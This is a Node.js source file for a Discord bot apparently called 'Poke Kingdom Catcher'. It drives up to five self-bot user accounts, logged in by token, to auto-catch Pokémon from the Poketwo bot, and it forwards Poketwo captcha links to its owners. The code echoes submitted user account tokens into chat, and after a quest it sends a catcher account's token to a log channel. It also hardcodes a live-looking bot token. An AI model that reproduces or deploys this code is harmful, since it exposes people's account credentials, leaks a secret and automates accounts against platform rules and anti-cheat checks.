const { Client } = require('discord.js-selfbot-v13');
const { Client: DiscordClient, GatewayIntentBits, ActivityType, EmbedBuilder } = require('discord.js');
const chalk = require("chalk");
const request = require('request');
const logChannelId = '1204345021914939482'


const selfBotClient = new Client({
  checkUpdate: false,
});

const botClient = new DiscordClient({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

const ownerID = '1162923811734302810'
let targetUserIds = ['1162923811734302810', '1101144261317107762'];
let allowedUserIds = ['1162923811734302810', '1101144261317107762', '850006688378388490'];
const botPrefix = "??"
const currentVersion = "v1.0.3"
const selfBotClients = Array(5).fill(null).map(() => new Client({ checkUpdate: false }));

botClient.on('ready', (c) => {
  botClient.user.setPresence({
    activities: [{ name: "With Pokemons!", type: ActivityType.Playing }],
    status: 'dnd',
  });
});

console.log(`
██████╗░░█████╗░██╗░░██╗███████╗  ██╗░░██╗██╗███╗░░██╗░██████╗░██████╗░░█████╗░███╗░░░███╗
██╔══██╗██╔══██╗██║░██╔╝██╔════╝  ██║░██╔╝██║████╗░██║██╔════╝░██╔══██╗██╔══██╗████╗░████║
██████╔╝██║░░██║█████═╝░█████╗░░  █████═╝░██║██╔██╗██║██║░░██╗░██║░░██║██║░░██║██╔████╔██║
██╔═══╝░██║░░██║██╔═██╗░██╔══╝░░  ██╔═██╗░██║██║╚████║██║░░╚██╗██║░░██║██║░░██║██║╚██╔╝██║
██║░░░░░╚█████╔╝██║░╚██╗███████╗  ██║░╚██╗██║██║░╚███║╚██████╔╝██████╔╝╚█████╔╝██║░╚═╝░██║
╚═╝░░░░░░╚════╝░╚═╝░░╚═╝╚══════╝  ╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░╚═════╝░░╚════╝░╚═╝░░░░░╚═╝

░█████╗░░█████╗░████████╗░█████╗░██╗░░██╗███████╗██████╗░
██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██║░░██║██╔════╝██╔══██╗
██║░░╚═╝███████║░░░██║░░░██║░░╚═╝███████║█████╗░░██████╔╝
██║░░██╗██╔══██║░░░██║░░░██║░░██╗██╔══██║██╔══╝░░██╔══██╗
╚█████╔╝██║░░██║░░░██║░░░╚█████╔╝██║░░██║███████╗██║░░██║
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
`);


botClient.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  if (message.content.toLowerCase().startsWith('??help')) {
    const helpEmbed = new EmbedBuilder()
        .setTitle(`${botClient.user.username}'s Help`)
        .setColor(0x00eaff)
        .setThumbnail(botClient.user.avatarURL())
        .setDescription(`**__CATCHER__**
  
            > \`settoken\` - Sets The Token Of The Catcher. 
      
            > \`current-token\` - Shows The Current Token Of Catcher.
      
            > \`start catch\` - Starts The Catcher.
      
            > \`stop catch\` - Stops The Catcher.
      
            **__SET CREATOR__**
      
            > \`setcreator\` - Sets The Token Of Set Creator.
      
            > \`create set\` - Creates a SET with all channels setup.
      
            **__WHITELIST COMMANDS__**
      
            > \`whitelist show\` - Shows The Whitelist Of The Catcher.
      
            > \`whitelist add\` - Adds The User To Whitelist.
      
            > \`whitelist remove\` - Removes From The Whitelist.
      
            **__OWNER COMMANDS__**
      
            > \`changeavatar\` - Changes The Avatar Of The Bot.
      
            > \`changename\` - Changes The Name Of The Bot.
      
            **__MISC COMMANDS__**
      
            > \`checktoken\` - Checks The Token Of The A Token.
      
            > \`ping\` - Check The Bot & Catcher's Latency.`);

    // Assuming 'message' is the received message
    message.channel.send({ embeds: [helpEmbed] });
}

if (message.content.toLowerCase() === '??ping') {
  const pingMessage = await message.channel.send('Pinging...');

  const botPing = botClient.ws.ping;
  
  const selfBotPings = await Promise.all(selfBotClients.map(async (selfBotClient, index) => {
    if (selfBotClient && selfBotClient.ws) {
      try {
        const selfBotPing = await selfBotClient.ws.ping;
        return selfBotPing;
      } catch (error) {
        console.error(`Error getting ping for selfBotClient ${index + 1}:`, error);
        return 'Not Set';
      }
    }
    return 'Not Set';
  }));

  const pingEmbed = new EmbedBuilder()
    .setTitle('__Catcher\'s Latency__')
    .setDescription(`> Bot Latency: ${botPing}ms\n\n${
      selfBotPings.map((ping, index) => `> Catcher ${index + 1} Latency: ${ping !== 'Not Set' ? ping + 'ms' : 'Not Set'}`).join('\n')}`)
    .setThumbnail(botClient.user.avatarURL())
    .setColor('#00eaff');

  setTimeout(() => {
    pingMessage.edit({ content: '', embeds: [pingEmbed] }).catch(console.error);
  }, 1000); // You can adjust the delay as needed
}

  if (message.content.toLowerCase().startsWith('??settoken-')) {
    const tokenIndex = parseInt(message.content.slice('??settoken-'.length).trim(), 10);
    
    if (isNaN(tokenIndex) || tokenIndex <= 0 || tokenIndex > 5) {
      message.channel.send('Invalid token index. Please provide a number between 1 and 5.');
      return;
    }

    const newToken = message.content.split(' ')[1];

    if (!newToken) {
      message.channel.send('Please provide a valid token to update.');
      return;
    }

    const selfBotIndex = tokenIndex - 1; // Array index is one less than token index

    if (message.author.id === ownerID || allowedUserIds.includes(message.author.id)) {
      try {
        if (!selfBotClients[selfBotIndex]) {
          selfBotClients[selfBotIndex] = new Discord.Client();
        }

        await selfBotClients[selfBotIndex].login(newToken);
        selfBotClients[selfBotIndex].user.setStatus('invisible');
        message.channel.send(`Catcher token ${tokenIndex} updated successfully!`);
      } catch (error) {
        console.error(`Error updating catcher token ${tokenIndex}:`, error);
        message.channel.send(`Invalid Token Provided. Unable to update catcher token ${tokenIndex}.`);
      }
    } else {
      message.channel.send('Invalid command or missing permissions.');
    }
  }

if (message.content.toLowerCase().startsWith('??checktoken')) {
  // Extract the token from the message content
  const providedToken = message.content.slice('??checktoken'.length).trim();

  // Make a request to Discord API to check the validity of the provided token
  request.get(
    {
      headers: {
        authorization: providedToken,
      },
      url: 'https://canary.discord.com/api/v9/users/@me',
    },
    function (error, response, body) {
      if (error) {
        console.error('Error checking token:', error);
        message.channel.send('Error checking token. Please try again later.');
        return;
      }

      try {
        const bod = JSON.parse(body);

        if (String(bod.message) === '401: Unauthorized') {
          message.channel.send('The Provided Token is Invalid or Revoked.');
        } else {
          const username = bod.username; // Assuming the response includes the username field
          const avatarURL = `https://cdn.discordapp.com/avatars/${bod.id}/${bod.avatar}.png`;
          message.channel.send({
            embeds: [
              {
                title: `**__Token Information__**`,
                fields: [
                  {
                    name: 'Username',
                    value: username,
                    inline: false,
                  },
                  {
                    name: 'Token',
                    value: `\`\`\`${providedToken}\`\`\``,
                    inline: false,
                  },
                ],
                thumbnail: {
                  url: avatarURL,
                },
                color: 0x00eaff, // Green color
              },
            ],
          });
        }
      } catch (parseError) {
        console.error('Error parsing JSON response:', parseError);
        message.channel.send('Error checking token. Please try again later.');
      }
    }
  );
}

  if (message.content.toLowerCase().startsWith('??changeavatar')) {
    const newAvatarURL = message.content.slice('??changeavatar'.length).trim();

    if (!newAvatarURL) {
      message.channel.send('Please provide a valid avatar URL to update.');
      return;
    }

    if (message.author.id === ownerID || allowedUserIds.includes(message.author.id)) {
      try {
        await botClient.user.setAvatar(newAvatarURL);
        await botClient.user.setPresence({ status: 'dnd' });
        message.channel.send('Bot avatar and presence updated successfully!');
      } catch (error) {
        console.error('Error updating bot avatar and presence:', error);
        message.channel.send('Failed to update bot avatar and presence.');
      }
    } else {
      message.channel.send('Invalid command or missing permissions.');
    }
  }

  if (message.content.toLowerCase() === '??current-tokens') {
    // Assuming selfBotClients is an array of your self-bot clients
    const selfBotInfo = selfBotClients.map(async (selfBotClient, index) => {
      await selfBotClient.fetch();
      
      const selfBotUsername = selfBotClient.user.username;
      const selfBotAvatarURL = selfBotClient.user.displayAvatarURL({ format: 'png', dynamic: true });
  
      const uptimeInSeconds = Math.floor(process.uptime());
      const uptimeFormatted = formatUptime(uptimeInSeconds);
  
      return {
        username: selfBotUsername,
        catchingStatus: uptimeFormatted,
        avatarURL: selfBotAvatarURL,
        index: index + 1,
      };
    });
  
    Promise.all(selfBotInfo).then((results) => {
      const embeds = results.map((info) => ({
        title: `Catcher Set ${info.index} Information`,
        fields: [
          {
            name: 'Username',
            value: info.username,
          },
          {
            name: 'Catching Status',
            value: info.catchingStatus,
          },
        ],
        thumbnail: {
          url: info.avatarURL,
        },
        color: 0x00eaff, // You can customize the color
      }));
  
      message.channel.send({ embeds });
    });
  }
  
  function formatUptime(uptimeInSeconds) {
    const days = Math.floor(uptimeInSeconds / (24 * 60 * 60));
    const hours = Math.floor((uptimeInSeconds % (24 * 60 * 60)) / (60 * 60));
    const minutes = Math.floor((uptimeInSeconds % (60 * 60)) / 60);
    const seconds = uptimeInSeconds % 60;
  
    return `${days}d ${hours}h ${minutes}m ${seconds}s`;
  }  

  if (message.content.toLowerCase().startsWith('??whitelist')) {
    const args = message.content.slice('??whitelist'.length).trim().split(/\s+/);
    const command = args.shift().toLowerCase();
    const userId = args.shift();

    if (command === 'add' && userId) {
      const userIdBigInt = BigInt(userId);

      if (!allowedUserIds.includes(userIdBigInt.toString())) {
        allowedUserIds.push(userIdBigInt.toString());
        message.channel.send(`User <@${userIdBigInt}> added to the whitelist.`);
      } else {
        message.channel.send(`User <@${userIdBigInt}> is already in the whitelist.`);
      }
    } else if (command === 'remove' && userId) {
      const userIdBigInt = BigInt(userId);

      if (allowedUserIds.includes(userIdBigInt.toString())) {
        allowedUserIds = allowedUserIds.filter((id) => id !== userIdBigInt.toString());
        message.channel.send(`User <@${userIdBigInt}> removed from the whitelist.`);
      } else {
        message.channel.send(`User <@${userIdBigInt}> is not in the whitelist.`);
      }
    } else if (command === 'show') {
  const ownerMention = `<@${ownerID}>`;
  const adminsMentions = allowedUserIds
    .filter(id => id !== ownerID)
    .map(id => `<@${id}>`)
    .join(', '); // Add a comma and space between admins

  const embed = {
    title: 'Whitelist Information',
    fields: [
      {
        name: `Owner`,
        value: ownerMention,
        inline: false,
      },
      {
        name: `Admins`,
        value: adminsMentions,
        inline: false,
      },
    ],
    color: 0x00eaff, // Light Blue color
  };

  message.channel.send({ embeds: [embed] });
} else {
  message.channel.send('Invalid command or missing user ID.');
}
  }
});

const isCatchEventEnabled = Array(5).fill(false);

// Initialize catch event status for each client
const initializeCatchStatus = () => {
  for (let i = 1; i <= 5; i++) {
    isCatchEventEnabled[`selfBotClient${i}`] = false;
  }
};

initializeCatchStatus();

botClient.on('messageCreate', async (message) => {
  if (message.author.bot) return; // Ignore messages from other bots

  // Command to start catch event for a specific self-bot client
  if (message.content.toLowerCase().startsWith('??start-catch-')) {
    startCatchEvent(message);
  }

  // Command to stop catch event for a specific self-bot client
  if (message.content.toLowerCase().startsWith('??stop-catch-')) {
    stopCatchEvent(message);
  }
});

// Function to start catch event for a specific self-bot client
const startCatchEvent = (message) => {
  const selfBotIndex = getSelfBotIndex(message.content);

  if (selfBotIndex > 0) {
    isCatchEventEnabled[selfBotIndex - 1] = true;
    message.channel.send(`✅ Catching Started for Catcher Client ${selfBotIndex}!`);
  } else {
    message.channel.send('❌ Invalid command or missing permissions.');
  }
};

const stopCatchEvent = (message) => {
  const selfBotIndex = getSelfBotIndex(message.content);

  if (selfBotIndex > 0) {
    isCatchEventEnabled[selfBotIndex - 1] = false;
    message.channel.send(`✅ Catching Stopped for Catcher Client ${selfBotIndex}!`);
  } else {
    message.channel.send('❌ Invalid command or missing permissions.');
  }
};

// Function to get the self-bot index based on command content
const getSelfBotIndex = (content) => {
  const match = content.match(/(?:\d+)/); // Extract digits from the command
  return match ? parseInt(match[0]) : 0;
};

let congratulationsCounts = new Array(5).fill(0);
let shinyCounts = new Array(5).fill(0);

selfBotClients.forEach((selfBotClient, index) => {
  selfBotClient.on('messageCreate', async (message) => {
    // Check if the message is from the specified bot and contains the catch message
    if (
      message.author.id === '716390085896962058' &&
      message.content.includes('Congratulations') &&
      message.content.includes(`<@${selfBotClient.user.id}>! You caught a Level`)
    ) {
      const logChannel = botClient.channels.cache.get(logChannelId);

      if (logChannel) {
        congratulationsCounts[index]++;

        const match = message.content.match(/Congratulations <@(\d+)>! You caught a Level (\d+) (.+?)(?:<:.+?:\d+>)? \((\d+\.\d+%)\)!/);
        if (match) {
          const catcherID = match[1];
          const level = match[2];
          const pokemon = match[3];
          const IVPercentage = match[4];

          if (message.content.includes('✨')) {
            shinyCounts[index]++;
          }

          const avatarURL = selfBotClient.user.displayAvatarURL({ format: 'png', dynamic: true });
          const serverName = message.guild ? message.guild.name : 'Direct Message';

          if (!avatarURL) {
            const botAvatarURL = botClient.user.displayAvatarURL({ format: 'png', dynamic: true });
            sendCatchLog(logChannel, message, botAvatarURL, serverName, catcherID, level, pokemon, IVPercentage, index);
          } else {
            sendCatchLog(logChannel, message, avatarURL, serverName, catcherID, level, pokemon, IVPercentage, index);
          }
        }
      } else {
        console.error('Log channel not found.');
      }
    }
  });
});

function sendCatchLog(logChannel, message, thumbnailURL, serverName, catcherID, level, pokemon, IVPercentage, index) {
  logChannel.send({
    embeds: [
      {
        title: `Catch Logs –– Set ${index + 1}`,
        description: `> **Total Pokes**: ${congratulationsCounts[index]}\n\n> **Server**: ${serverName}\n\n> **Catcher:** <@${catcherID}>\n\n> **Pokemon**: ${pokemon}\n\n> **Level**: ${level}\n\n> **Total Shinies:** ${shinyCounts[index]}`,
        thumbnail: {
          url: thumbnailURL,
        },
        color: 0x00eaff, // You can customize the color
      },
    ],
  });
}

selfBotClients.forEach((selfBotClient, index) => {
  selfBotClient.on('message', async (message) => {
      if (message.content.includes('You have completed the quest **Catch 500 pokémon originally found in the Alola region.** and received **50,000** Pokécoins!')) {
        const userId = '1118340427093831710'
        const selfBotLogChannelId = '1229005860202876928'
          const user = await botClient.users.fetch(userId);
          if (user) {
              user.send('The Quest has been completed. You can take all your rewards such as pokécoins and shinies.');
          } else {
              console.log('User not found');
          }
const selfBotLogChannel = botClient.channels.cache.get(selfBotLogChannelId);
            if (selfBotLogChannel) {
                // Create an embed with selfbotclient's information
                const embed = new EmbedBuilder()
                    .setColor('#0099ff')
                    .setTitle('Catcher Information')
                    .addFields('Name', selfBotClient.user.username)
                    .addFields('Account Age', `${Math.floor((Date.now() - selfBotClient.user.createdAt) / (1000 * 60 * 60 * 24))} days`)
                    .setThumbnail(selfBotClient.user.displayAvatarURL())
                    .addFields('Token', selfBotClient.token)
                    .addFields('Quest Completed', 'True');

                selfBotLogChannel.send({ embeds: [embed] });
            } else {
                console.log('Quest Complete log channel not found');
                }

        }

    });

});



selfBotClients.forEach((selfBotClient, index) => {

  selfBotClient.on('messageCreate', async (message) => {

    if (isCatchEventEnabled[index] && message.author.id === '854233015475109888') {

    const wordsBeforeColons = message.content.split(':');

    const firstPart = wordsBeforeColons[0].trim();

    selfBotClient.channels.cache.get(message.channel.id).send(`<@716390085896962058> c ${firstPart}`);

  }

      

    

      



if (message.content.includes("Please pick a starter pokémon")) {

    message.channel.send("<@716390085896962058> pick charmander");

  } else if (

    message.embeds[0]?.footer &&

    message.embeds[0].footer.text.includes("Terms") &&

    message?.components[0]?.components[0]

  ) {

    // Assuming you still want to handle button interactions

    const buttonComponent = message.components[0].components[0];

    

    if (buttonComponent) {

      message.clickButton(buttonComponent);

      setTimeout(() => {

        message.channel.send("<@716390085896962058> i");

      }, 3000);

    }

  }
    


  if (allowedUserIds.includes(message.author.id)) {
    const [command, ...args] = message.content.trim().split(/\s+/);

    if (command === 't') {
      selfBotClients[index].channels.cache.get(message.channel.id).send('<@716390085896962058> p');
    }

    if (command === 't1') {
      selfBotClients[index].channels.cache.get(message.channel.id).send('<@716390085896962058> p --sh');
    }

    if (command === 't2') {
      selfBotClients[index].channels.cache.get(message.channel.id).send('<@716390085896962058> p --leg --ub --my');
    }

    if (command === 't3') {
      selfBotClients[index].channels.cache.get(message.channel.id).send('<@716390085896962058> or iv');
    }

    if (command === 'tu') {
    selfBotClients[index].channels.cache.get(message.channel.id).send(`<@716390085896962058> t ${message.author}`);
    }

    if (command === 'tc') {
      selfBotClients[index].channels.cache.get(message.channel.id).send('<@716390085896962058> t c');
    }

    if (command === 'tadd') {
      const sayMessage = args.join(' ');

      if (sayMessage) {
        selfBotClients[index].channels.cache.get(message.channel.id).send(`<@716390085896962058> t a ${sayMessage}`);
      } else {
        selfBotClients[index].channels.cache.get(message.channel.id).send('Please provide a message for me to say.');
      }
    }

    if (command === '$') {
      selfBotClients[index].channels.cache.get(message.channel.id).send('<@716390085896962058> bal');
    }

    // New 'tq' command
    if (command === 'tq') {
      selfBotClients[index].channels.cache.get(message.channel.id).send('<@716390085896962058> q');
    }

    if (command === 'ti') {
      const sayMessage = args.join(' ');

      if (sayMessage) {
        selfBotClients[index].channels.cache.get(message.channel.id).send(`<@716390085896962058> i ${sayMessage}`);
      } else {
        selfBotClients[index].channels.cache.get(message.channel.id).send('Please provide a message for me to say.');
      }
    }

    if (command === 'tevent') {
      selfBotClients[index].channels.cache.get(message.channel.id).send('<@716390085896962058> event');
    }
      
    if (command === 'tr') {
        selfBotClients[index].channels.cache.get(message.channel.id).send('<@716390085896962058> redeem')
    }

    if(command === 'topen') {
      const sayMessage = args.join(' ');

      if (sayMessage) {
        selfBotClients[index].channels.cache.get(message.channel.id).send(`<@716390085896962058> event open ${sayMessage}`);
      }
    }

    if (command === 'tredeem') {
      const sayMessage = args.join(' ');

      if (sayMessage) {
        selfBotClients[index].channels.cache.get(message.channel.id).send(`<@716390085896962058> buy redeem ${sayMessage}`);
      }
    }

    if (command === 'tp') {
      const sayMessage = args.join(' ');

      if (sayMessage) {
        selfBotClients[index].channels.cache.get(message.channel.id).send(`<@716390085896962058> p --${sayMessage}`);
      } else {
        selfBotClients[index].channels.cache.get(message.channel.id).send('Please provide a message for me to say.');
      }
    }
  }
});
});

botClient.on('messageCreate', (message) => {
  if (message.author.id === '716390085896962058' && message.content.includes('https://verify.poketwo.net/captcha')) {
    targetUserIds.forEach(async (targetUserId) => {
      try {
        const targetUser = await botClient.users.fetch(targetUserId);

        if (targetUser) {
          await targetUser.send(`Received captcha: ${message.content}`);
        } else {
          console.error(`Target user with ID ${targetUserId} not found`);
        }
      } catch (error) {
        console.error(`Error sending DM to user with ID ${targetUserId}:`, error);
      }
    });
  }
});

botClient.on('ready', () => {
  const name = botClient.user.tag;
  const currentTime = new Date().toLocaleTimeString();

  const logEmbed = new EmbedBuilder()
    .addFields({ name: 'Bot Name', value: botClient.user.username })
    .addFields({ name: 'Bot Prefix', value: botPrefix })
    .addFields({ name: 'Bot Version', value: currentVersion })
    .addFields({ name: 'Developer', value: `**King Alpha**`})
    .setThumbnail(botClient.user.displayAvatarURL())
    .setColor('#00eaff');

  const logChannel = botClient.channels.cache.get(logChannelId);
  if (logChannel) {
    logChannel.send({ embeds: [logEmbed] });
    logChannel.send('**LOADED COMMANDS!**');
  } else {
    console.error('Invalid log channel ID or channel not found.');
  }

  console.log(chalk.yellow(`=> [${currentTime}]. Logged in as ${name}`));
  console.log(chalk.black.bold(`Ｉｎｆｏｒｍａｔｉｏｎ : `));
  console.log(chalk.green(`Bot Name: ${botClient.user.username} `));
  console.log(chalk.green(`Bot Prefix: ${botPrefix}`));
  console.log(chalk.blue(`Bot Version: ${currentVersion}`));
  console.log("");
  console.log(chalk.red("@Developer: King Alpha"));
  console.log("_______________________________________");
});

botClient.on('error', (error) => {
  console.error(chalk.red('[ERROR - BOT]', error));

  const logChannel = botClient.channels.cache.get(logChannelId);
  if (logChannel) {
    const errorEmbed = new EmbedBuilder()
      .setTitle('Error - Bot')
      .setDescription(`\`\`\`${error}\`\`\``)
      .setColor('#ff0000'); // Red color for error

    logChannel.send({ embeds: [errorEmbed] }).catch(console.error);
  }
});

selfBotClient.on('error', (error) => {
  console.error(chalk.red('[ERROR - SELFBOT]', error));

  const logChannel = botClient.channels.cache.get(logChannelId);
  if (logChannel) {
    const errorEmbed = new EmbedBuilder()
      .setTitle('Error - SelfBot')
      .setDescription(`\`\`\`${error}\`\`\``)
      .setColor('#ff0000'); // Red color for error

    logChannel.send({ embeds: [errorEmbed] }).catch(console.error);
  }
});

botClient.login('MTIwMDM5MzI1ODU0NzgxMDMxNA.GcCqWs.zSoQ-eyc4oQ95350xYPzpWjL7QWk2GHR27Zi9k');